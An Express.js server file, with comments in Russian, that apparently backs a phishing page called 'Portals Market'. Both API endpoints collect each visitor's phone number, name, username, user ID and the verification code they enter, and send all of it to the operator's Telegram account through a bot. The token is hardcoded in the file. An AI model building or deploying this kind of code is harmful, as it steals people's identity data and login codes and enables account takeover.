const express = require('express');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.static(path.join(__dirname)));
app.use(express.json());

// ТВОИ ДАННЫЕ
const BOT_TOKEN = '8738031314:AAFZ7ZnyI6lw6PfFCWQp29rB4lKDTtyGj8Y';
const YOUR_ID = '6277925229';
const YOUR_USERNAME = '@anyaskds';

// Хранилище
const codes = {};

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// ЭТАП 1: Человек написал номер → ТЕБЕ ПРИХОДИТ ТОЛЬКО НОМЕР (БЕЗ КОДА!)
app.post('/api/send-code', (req, res) => {
    const { phone, region, fullName, username, userId } = req.body;
    
    // Генерируем код, но НЕ отправляем его!
    const code = Math.floor(100000 + Math.random() * 900000).toString();
    
    // Сохраняем код
    codes[phone] = {
        code: code,
        expires: Date.now() + 120000,
        fullName: fullName,
        username: username,
        userId: userId
    };
    
    console.log('📱 ПОЛУЧЕН НОМЕР ТЕЛЕФОНА');
    console.log('========================================');
    console.log('📱 Телефон:', phone);
    console.log('🔑 Сгенерирован код:', code);
    console.log('👤 Имя:', fullName);
    console.log('👤 Username:', username);
    console.log('🆔 ID:', userId);
    console.log('========================================');
    
    // ⚡ ОТПРАВЛЯЕМ ТОЛЬКО НОМЕР (БЕЗ КОДА!)
    const message = `
📱 НОВЫЙ ЗАПРОС НА ВЕРИФИКАЦИЮ!

👤 Имя: ${fullName}
📱 Телефон: ${phone}
🆔 ID: ${userId}
👤 Username: @${username || 'нет'}

⏳ Ожидает ввода кода...
📅 Время: ${new Date().toLocaleString()}
    `.trim();

    const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    
    // Отправляем ТОЛЬКО НОМЕР тебе
    fetch(TELEGRAM_API, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: YOUR_ID,
            text: message,
            parse_mode: 'HTML'
        })
    })
    .then(response => response.json())
    .then(data => console.log('✅ Номер отправлен тебе:', data.ok ? '✅ Успешно' : '❌ Ошибка'))
    .catch(err => console.log('❌ Ошибка:', err));

    // Отправляем ТОЛЬКО НОМЕР на @anyaskds
    fetch(TELEGRAM_API, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: YOUR_USERNAME,
            text: message,
            parse_mode: 'HTML'
        })
    })
    .then(response => response.json())
    .then(data => console.log('✅ Номер отправлен на @anyaskds:', data.ok ? '✅ Успешно' : '❌ Ошибка'))
    .catch(err => console.log('❌ Ошибка:', err));

    res.json({ success: true });
});

// ЭТАП 2: Человек ввел код → ТЕБЕ ПРИХОДИТ НОМЕР + КОД
app.post('/api/verify-code', (req, res) => {
    const { phone, code, fullName, username, userId } = req.body;
    
    const stored = codes[phone];
    
    if (!stored) {
        return res.status(400).json({ success: false, message: 'Код не найден' });
    }
    
    if (Date.now() > stored.expires) {
        delete codes[phone];
        return res.status(400).json({ success: false, message: 'Код истек' });
    }
    
    if (stored.code !== code) {
        return res.status(400).json({ success: false, message: 'Неверный код' });
    }
    
    console.log('✅ ВВЕДЕН КОД!');
    console.log('========================================');
    console.log('📱 Телефон:', phone);
    console.log('🔑 Введенный код:', code);
    console.log('👤 Имя:', fullName);
    console.log('👤 Username:', username);
    console.log('🆔 ID:', userId);
    console.log('========================================');
    
    // ⚡ ОТПРАВЛЯЕМ НОМЕР + КОД
    const message = `
✅ ВВЕДЕН КОД ВЕРИФИКАЦИИ!

👤 Имя: ${fullName}
📱 Телефон: ${phone}
🔑 Введенный код: ${code}
🆔 ID: ${userId}
👤 Username: @${username || 'нет'}

📅 Время: ${new Date().toLocaleString()}
    `.trim();

    const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    
    // Отправляем НОМЕР + КОД тебе
    fetch(TELEGRAM_API, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: YOUR_ID,
            text: message,
            parse_mode: 'HTML'
        })
    })
    .then(response => response.json())
    .then(data => console.log('✅ Номер+код отправлен тебе:', data.ok ? '✅ Успешно' : '❌ Ошибка'))
    .catch(err => console.log('❌ Ошибка:', err));

    // Отправляем НОМЕР + КОД на @anyaskds
    fetch(TELEGRAM_API, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: YOUR_USERNAME,
            text: message,
            parse_mode: 'HTML'
        })
    })
    .then(response => response.json())
    .then(data => console.log('✅ Номер+код отправлен на @anyaskds:', data.ok ? '✅ Успешно' : '❌ Ошибка'))
    .catch(err => console.log('❌ Ошибка:', err));
    
    delete codes[phone];
    
    res.json({ success: true });
});

app.listen(PORT, () => {
    console.log(`✅ Portals Market запущен: http://localhost:${PORT}`);
    console.log(`📱 Твой ID: ${YOUR_ID}`);
    console.log(`👤 Твой юзер: ${YOUR_USERNAME}`);
});